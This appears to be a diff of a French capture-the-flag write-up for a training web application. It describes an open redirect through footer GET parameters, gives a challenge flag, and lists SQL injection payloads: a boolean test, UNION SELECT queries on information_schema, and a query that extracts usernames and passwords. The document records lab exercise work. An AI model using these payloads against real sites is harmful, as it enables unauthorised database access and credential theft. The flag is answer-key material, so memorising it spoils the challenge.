@@ -1,2 +1,17 @@
+Methode 1 :
 On peux voir dans le pied de page des redirection avec la methode GET dans l'URL, on peux utiliser la méthode pour rediriger vers un autre site en changeant l'url de site
 FLAG = B9E775A0291FED784A2D9680FCFAD7EDD6B8CDF87648DA647AAF4BBA288BCAB3
+
+Methode 2 :
+Dans la partie membres on peux faire une recherche d'utilisateur qui execute une requete sql.
+On teste avec 1 AND 1 = 1 et on a un resultat, le site est donc sensible aux injections.
+Sur le site suivant nous avons un exemple de comment faire une injection
+
+
+nous avons donc ceci pour voir toutes les tables
+
+http://www.sqlinjection.net/table-names/
+
+" 1 AND 1=2 UNION SELECT table_schema, table_name FROM information_schema.tables "
+" 5 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns "
+" 1 AND 1=2 UNION SELECT username, password FROM Member_Brute_Force.db_default "
